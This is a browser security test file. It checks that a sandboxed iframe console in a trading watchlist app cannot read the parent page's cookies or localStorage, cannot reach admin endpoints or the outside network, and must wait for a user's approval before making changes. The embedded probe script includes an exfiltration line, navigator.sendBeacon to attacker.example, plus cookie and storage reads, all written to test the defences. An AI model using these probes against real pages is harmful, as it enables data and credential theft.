// @vitest-environment node
import { describe, expect, it } from "vitest";
import { chromium } from "@playwright/test";
import { WATCHLIST_CONSOLE_CSP } from "@/src/modules/watchlist/server/runtime/watchlist-console-sandbox";
import { rewriteWatchlistRuntimeDocument } from "@/src/modules/watchlist/server/runtime/watchlist-runtime-admin-document";
import { readWatchlistConsoleRequest } from "./watchlist-console-bridge";

describe("real browser opaque console boundary with synthetic routes", () => {
  it("blocks parent DOM/credential access and direct network; relays reads and waits for mutation approval", async () => {
    const browser = await chromium.launch({ headless: true });
    try {
      const page = await browser.newPage();
      const unexpected: string[] = [];
      await page.exposeFunction("validateRelay", (value: unknown) => readWatchlistConsoleRequest(value, "https://console.example.test"));
      const parent = `<!doctype html><button id="approve">Confirm change</button><iframe sandbox="allow-scripts" src="/console"></iframe><script>
      window.results=[];window.sent=[];window.pending=null;
      const frame=document.querySelector('iframe');
      window.addEventListener('message',async e=>{
       if(e.source!==frame.contentWindow||e.origin!=='null')return;
       if(e.data?.source==='probe'){window.results.push(e.data);return;}
       if(e.data?.source!=='traderslink-watchlist-relay'||e.data.type!=='request')return;
       const input=await window.validateRelay(e.data);
       const reply=result=>frame.contentWindow.postMessage({source:'traderslink-watchlist-relay-response',id:e.data.id,...result},'*');
       if(!input){reply({error:'blocked'});return;}
       if(input.method==='POST'){window.pending={input,reply};return;}
       reply({status:200,contentType:'application/json',body:'{"ok":true}'});
      });
      document.querySelector('#approve').onclick=()=>{const pending=window.pending;if(pending){window.sent.push(pending.input);pending.reply({status:200,contentType:'application/json',body:'{}'});window.pending=null;}};
      </script>`;
      const child = rewriteWatchlistRuntimeDocument(`<!doctype html><html><head></head><body><script>
       const probe=detail=>parent.postMessage({source:'probe',...detail},window.location.origin);
       try{parent.document.cookie;probe({parentReadable:true});}catch{probe({parentReadable:false});}
       try{localStorage.getItem('private');probe({storageReadable:true});}catch{probe({storageReadable:false});}
       try{navigator.sendBeacon('https://attacker.example/collect','private');}catch{}
       fetch('/api/admin/journal/users').then(()=>probe({journalBlocked:false})).catch(()=>probe({journalBlocked:true}));
       fetch('/api/admin/watchlist/runtime/watchlist').then(r=>r.json()).then(value=>probe({read:value.ok}));
       fetch('/api/admin/watchlist/runtime/watchlist/activate',{method:'POST',body:'{"symbol":"ABCD"}'}).then(()=>probe({mutationCompleted:true}));
      </script></body></html>`);
      await page.route("**/*", async route => {
        const url = new URL(route.request().url());
        if (url.origin !== "https://console.example.test") { unexpected.push(url.href); return route.abort(); }
        if (url.pathname === "/") return route.fulfill({ contentType: "text/html", body: parent });
        if (url.pathname === "/console") return route.fulfill({ headers: { "content-type": "text/html", "content-security-policy": WATCHLIST_CONSOLE_CSP }, body: child });
        unexpected.push(url.href); return route.abort();
      });
      await page.goto("https://console.example.test/");
      await page.waitForFunction(() => (window as unknown as { results: object[]; pending: unknown }).results.length >= 4 && Boolean((window as unknown as { pending: unknown }).pending));
      const before = await page.evaluate(() => ({ results: (window as unknown as { results: object[] }).results, sent: (window as unknown as { sent: object[] }).sent }));
      expect(before.results).toEqual(expect.arrayContaining([{ source: "probe", parentReadable: false }, { source: "probe", storageReadable: false }, { source: "probe", journalBlocked: true }, { source: "probe", read: true }]));
      expect(before.sent).toEqual([]);
      await page.click("#approve");
      await page.waitForFunction(() => (window as unknown as { results: { mutationCompleted?: boolean }[] }).results.some(item => item.mutationCompleted));
      expect(await page.evaluate(() => (window as unknown as { sent: { body: string }[] }).sent[0].body)).toBe('{"symbol":"ABCD"}');
      expect(unexpected).toEqual([]);
    } finally { await browser.close(); }
  }, 30_000);
});
